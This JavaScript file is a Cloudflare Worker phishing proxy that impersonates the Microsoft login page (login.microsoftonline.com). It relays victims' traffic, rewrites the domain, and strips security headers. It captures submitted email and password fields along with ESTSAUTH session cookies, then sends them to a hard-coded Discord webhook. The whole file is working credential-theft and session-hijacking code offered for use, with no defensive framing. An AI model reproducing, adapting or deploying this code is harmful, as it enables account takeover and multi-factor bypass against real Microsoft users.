// ============================================================
// MICROSOFT PROXY – sends credentials + cookie .txt file to Discord
// No extra paths, pure original logic.
// ============================================================

// ---------- CONFIGURATION ----------
// Replace with your actual Discord webhook URL (or use env)
const WEBHOOK_URL = "https://discord.com/api/webhooks/1544756994223640576/c2Q3UlybpV1MC1Dmg1vECmhdyYJieaDKTl9Y1Pk3EGud-FewDV4bQWSTTbTHz4p32DPT"

// Microsoft upstream (unchanged)
const upstream = 'login.microsoftonline.com'
const upstream_path = '/'
const https = true

// Blocking (unchanged)
const blocked_region = []
const blocked_ip_address = ['0.0.0.0', '127.0.0.1']

// ---------- WORKER ENTRY ----------
addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

// ---------- MAIN HANDLER ----------
async function fetchAndApply(request) {
    const region = request.headers.get('cf-ipcountry')?.toUpperCase() || '';
    const ip_address = request.headers.get('cf-connecting-ip') || '';
   
    let all_cookies = "";
    let response = null;
    let url = new URL(request.url);
    let url_hostname = url.hostname;

    if (https == true) {
        url.protocol = 'https:';
    } else {
        url.protocol = 'http:';
    }

    var upstream_domain = upstream;
    url.host = upstream_domain;

    // ORIGINAL PATH HANDLING – NO EXTRA /common/login
    if (url.pathname == '/') {
        url.pathname = upstream_path;
    } else {
        url.pathname = upstream_path + url.pathname;
    }

    if (blocked_region.includes(region) || blocked_ip_address.includes(ip_address)) {
        return new Response('Access denied.', { status: 403 });
    }

    let method = request.method;
    let request_headers = new Headers(request.headers);
    request_headers.set('Host', upstream_domain);
    request_headers.set('Referer', url.protocol + '//' + url_hostname);

    // ---- Variables to store captured credentials ----
    let capturedEmail = null;
    let capturedPassword = null;

    // ---- Handle POST body (credentials) ----
    if (method === 'POST') {
        const temp_req = await request.clone();
        const body = await temp_req.text();
        const keyValuePairs = body.split('&');
        for (const pair of keyValuePairs) {
            const [key, value] = pair.split('=');
            if (key === 'login') {
                capturedEmail = decodeURIComponent(value.replace(/\+/g, ' '));
            }
            if (key === 'passwd') {
                capturedPassword = decodeURIComponent(value.replace(/\+/g, ' '));
            }
        }
        // We DO NOT send immediately – we'll combine with cookies later.
    }

    // ---- Forward request ----
    let original_response = await fetch(url.href, {
        method: method,
        headers: request_headers,
        body: request.body
    });

    // WebSocket upgrade
    const connection_upgrade = request_headers.get("Upgrade");
    if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
        return original_response;
    }

    let original_response_clone = original_response.clone();
    let response_headers = new Headers(original_response.headers);
    let status = original_response.status;

    // ---- CORS & security cleanup ----
    response_headers.set('access-control-allow-origin', '*');
    response_headers.set('access-control-allow-credentials', true);
    response_headers.delete('content-security-policy');
    response_headers.delete('content-security-policy-report-only');
    response_headers.delete('clear-site-data');

    // ---- Cookie rewriting and capture ----
    try {
        const originalCookies = response_headers.getAll("Set-Cookie");
        all_cookies = originalCookies.join("; \n");
        response_headers.delete("Set-Cookie");
        originalCookies.forEach(cookie => {
            const modified = cookie.replace(/login\.microsoftonline\.com/g, url_hostname);
            response_headers.append("Set-Cookie", modified);
        });
    } catch (e) {
        console.error('Cookie error:', e);
    }

    // ---- Rewrite response body ----
    const original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);

    // ---- Prepare Discord delivery ----
    // Check if we have both credentials and session cookies
    const hasSession = all_cookies && (all_cookies.toLowerCase().includes('estsauth') || all_cookies.toLowerCase().includes('estsauthpersistent'));

    if (capturedEmail && capturedPassword) {
        // Build a text message with credentials
        let discordContent = `**🔐 Credentials captured**\n**👤 User**: ${capturedEmail}\n**🔑 Password**: ${capturedPassword}`;
        if (hasSession) {
            // Also attach the cookie file
            const cookieFileName = `cookies_${capturedEmail}.txt`;
            await sendDiscordWithFile(discordContent, cookieFileName, all_cookies);
        } else {
            // Just send credentials (no cookies yet)
            await sendDiscordSimple(discordContent);
        }
    } else if (hasSession) {
        // Only cookies, no credentials (rare)
        await sendDiscordWithFile(`**🍪 Session cookies found (no credentials)**`, `cookies.txt`, all_cookies);
    } else {
        // Nothing to send – maybe debug
    }

    return new Response(original_text, {
        status,
        headers: response_headers
    });
}

// ---------- RESPONSE BODY REWRITER ----------
async function replace_response_text(response, upstream_domain, host_name) {
    let text = await response.text();
    let re = new RegExp(upstream_domain.replace(/\./g, '\\.'), 'g');
    return text.replace(re, host_name);
}

// ---------- DISCORD SENDERS ----------

// Send a simple text message (no file)
async function sendDiscordSimple(content) {
    const payload = { content };
    try {
        const resp = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!resp.ok) console.error('Discord simple error:', await resp.text());
    } catch (e) { console.error('Discord simple exception:', e.message); }
}

// Send a message with a text file attachment
async function sendDiscordWithFile(content, filename, fileContent) {
    // Create FormData
    const formData = new FormData();
    formData.append('content', content);
    // Append the file – use a Blob from the string
    const blob = new Blob([fileContent], { type: 'text/plain' });
    formData.append('file', blob, filename);

    try {
        const resp = await fetch(WEBHOOK_URL, {
            method: 'POST',
            body: formData
        });
        if (!resp.ok) console.error('Discord file error:', await resp.text());
    } catch (e) { console.error('Discord file exception:', e.message); }
}